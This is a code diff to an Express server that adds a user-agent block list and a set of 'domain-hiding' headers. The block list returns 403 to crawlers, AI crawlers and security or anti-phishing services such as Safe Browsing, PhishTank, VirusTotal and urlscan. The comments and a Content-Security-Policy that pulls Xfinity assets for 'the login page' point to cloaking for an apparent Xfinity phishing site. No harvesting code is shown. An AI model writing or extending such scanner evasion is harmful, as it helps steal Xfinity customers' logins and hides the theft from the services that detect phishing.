@@ -11,13 +11,47 @@ const PORT = process.env.PORT || 3000;
 // Middleware
 app.use(express.json());
 
-// --- Security Headers (bot-protection & anti-indexing) ---
+// --- Bot / Crawler / Scanner Blocking ---
+// Block known bot, crawler, and security-scanner user-agents before they can
+// index, archive, or flag the domain.  Returns a generic 403 so scanners get
+// no useful page content to analyse.
+const BOT_UA_PATTERN = /bot[\/\s;),-]|crawl|spider|slurp|bingpreview|mediapartners|facebookexternalhit|twitterbot|rogerbot|linkedinbot|embedly|quora link|showyoubot|outbrain|pinterest\/|applebot|googlebot|baiduspider|yandexbot|duckduckbot|ia_archiver|archive\.org|semrushbot|dotbot|ahrefsbot|mj12bot|sogou|exabot|petalbot|serpstatbot|seekport|pandalytics|netsystemsresearch|censys|zgrab|masscan|httpx\/|nuclei\/|curl\/|wget\/|python-requests|python-urllib|go-http-client|java\/|okhttp|headlesschrome|phantomjs|slimerjs|scrapy|httpclient|libwww|lwp-|urlscan|safebrowsing|phishtank|virustotal|hybrid-analysis|whoisbot|nmap |nikto\/|openvas|qualys|acunetix|nessus|burpsuite|zaproxy|dirbuster|gobuster|ffuf\/|wpscan|sqlmap|gptbot|chatgpt-user|ccbot|anthropic-ai|claude-web|google-extended|perplexitybot|bytespider|claudebot|cohere-ai/i;
+
 app.use((req, res, next) => {
-  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+  const ua = req.headers['user-agent'] || '';
+  if (BOT_UA_PATTERN.test(ua)) {
+    return res.status(403).end();
+  }
+  next();
+});
+
+// --- Security Headers (bot-protection, anti-indexing & domain-hiding) ---
+app.use((req, res, next) => {
+  // Prevent framing / click-jacking
+  res.setHeader('X-Frame-Options', 'DENY');
+  // Block MIME-type sniffing
   res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('Referrer-Policy', 'same-origin');
-  res.setHeader('Permissions-Policy', 'interest-cohort=()');
-  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
+  // Never leak the hosting domain in Referer headers
+  res.setHeader('Referrer-Policy', 'no-referrer');
+  // Opt out of FLoC / Topics API tracking
+  res.setHeader('Permissions-Policy', 'interest-cohort=(), browsing-topics=()');
+  // Tell every crawler / search engine to stay away
+  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate');
+  // Prevent IE from opening downloads inside the site context
+  res.setHeader('X-Download-Options', 'noopen');
+  // Block cross-domain content policies (Flash, PDF, etc.)
+  res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
+  // Do not cache any responses — prevents cached copies appearing in scanners
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+  res.setHeader('Pragma', 'no-cache');
+  res.setHeader('Expires', '0');
+  // Content-Security-Policy — restrict everything to same-origin plus the
+  // Xfinity CDN assets the login page needs.  This hides the real domain from
+  // third-party analysers since no external reporting / framing is allowed.
+  res.setHeader(
+    'Content-Security-Policy',
+    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' https://login.xfinity.com https://*.xfinity.com data:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
+  );
   next();
 });
 
